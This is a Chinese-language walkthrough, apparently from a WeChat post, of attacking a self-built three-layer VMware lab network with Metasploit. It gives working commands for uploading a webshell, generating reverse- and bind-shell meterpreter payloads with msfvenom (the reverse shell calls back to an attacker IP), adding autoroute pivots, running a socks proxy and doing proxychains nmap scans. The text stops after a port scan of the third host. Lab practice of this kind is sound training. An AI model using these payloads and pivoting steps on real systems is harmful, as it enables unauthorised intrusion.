# 三层网络靶场搭建&MSF内网渗透

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzg2NDYwMDA1NA==&mid=2247518754&idx=1&sn=b34ea4b7da099503aac8cda5e710c4e1&chksm=ce6420bbf913a9ad81920b6b75e8e475309c80e5452f1c996488481b66253284008d7b9d6f54&scene=126&sessionid=1681667504#rd](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247518754&idx=1&sn=b34ea4b7da099503aac8cda5e710c4e1&chksm=ce6420bbf913a9ad81920b6b75e8e475309c80e5452f1c996488481b66253284008d7b9d6f54&scene=126&sessionid=1681667504#rd)

![](../Images/b80c7186878bb30d555f03d9b96a4690.png)

在最近的CTF比赛中，综合靶场出现的次数越来越多，这种形式的靶场和真实的内网渗透很像，很贴合实际工作，但我们往往缺少多层网络的练习环境。本文通过VMware搭建3层网络，并通过msf进行内网渗透，涉及代理搭建，流量转发，端口映射等常见内网渗透技术。

## 第一层靶机

Nmap探测一下，发现8080端口：

![](../Images/ae8f16a99fb1d92af483236cce7f88dd.png)

访问一下：

![](../Images/66f916d8591fdc556c15020952c0bddc.png)

返现文件上传点，经测试没有任何过滤，可以直接上传任意文件，因此直接上传jsp一句话后门：

![](../Images/1880b897fd601c392cdb55a20712eb68.png)

上传后返回文件路径，菜刀连接：

![](../Images/27976a70188d2f463b16b91602df9ae3.png)

为了进一步做内网渗透，上传msf后门：

1、后门制作：

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.59.128 LPORT=6666 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf >shell.elf`

将shell.elf上传到第一层靶机192.168.59.129

2、MSF设置监听：

![](../Images/8408fb7d1e2a5d01ce1d42937bd0c3d5.png)

3、在第一层靶机运行shell.elf

`Chmod 777 shell.elf`  
`./shell.elf`

4、Msf获得meterpreter，执行shell，查看网络配置，发现双网卡，第二层网络段为192.168.80.0/24

![](../Images/ebc33ace061fd7dfc442230b069e87f2.png)

## 第二层靶机

首先利用第一层的meterpreter添加到第二层的路由：

`run autoroute -s 192.168.80.0/24`

![](../Images/911c7b30a2844b2801cf34cb74ff73aa.png)

然后利用msf进行第二层网络存活主机扫描：

`use auxiliary/scanner/discovery/arp_sweep`

![](../Images/32ff8d15b092069e1054eca75c23bb3c.png)

发现第二层靶机 192.168.80.129。

接着利用msf搭建socks代理，好让攻击机直接打第二层网络：

`use auxiliary/server/socks4a`

![](../Images/13920379c2f601c8fc4112f3608a2e72.png)

然后在第一层网络配置相关socks4代理客户端：

Proxychain:

在配置文件/etc/proxychains.conf中添加：

socks4 192.168.59.128 9999

然后利用proxychans 启动nmap对第二层靶机进行扫描，这里注意一定要加上-Pn和-sT参数：

`proxychains nmap -Pn -sT 192.168.80.129 -p1-1000`

![](../Images/88d91a9a6f5566b923805f3fefdf118c.png)

发现第二层主机开放22和80端口。

在Chrome中配置代理

![](../Images/52e51d783b1d35f98b3540ccc581bf4c.png)

访问第二层网络：

![](../Images/325ff44e300ae627a834434850c0060f.png)

![](../Images/c490b0750a06d824dca27a676210a985.png)

![](../Images/da792135cc62f77ae6e6ea2dad09fe5f.png)

可以看到 shell 路径，用蚁剑连接，因为是第二层网络，所以得通过socks代理客户端去启动蚁剑，我用的是sockscap64：

同样，为了打进第三层，我们需要在第二层靶机上上传msf后门，

制作后门：

`msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=4321 -f elf > shell1.elf`

利用蚁剑上传，并在第二层靶机运行：

`Chmod 777 ./shell1.elf`  
`./shell1.elf`

![](../Images/f68777d2303cf154e9d68ce1bfe59c39.png)

`run autoroute -s 192.168.226.0/24`

![](../Images/f51160198ac325b06ee850943c354007.png)

![](../Images/979286bba997f2707c61de22c9e3956c.png)

`proxychains nmap -Pn -sT 192.168.226.129 -p1-1000`

![](../Images/a792c30724761b0b6627bcf3bf1dfafa.png)

发现开放了80、445端口
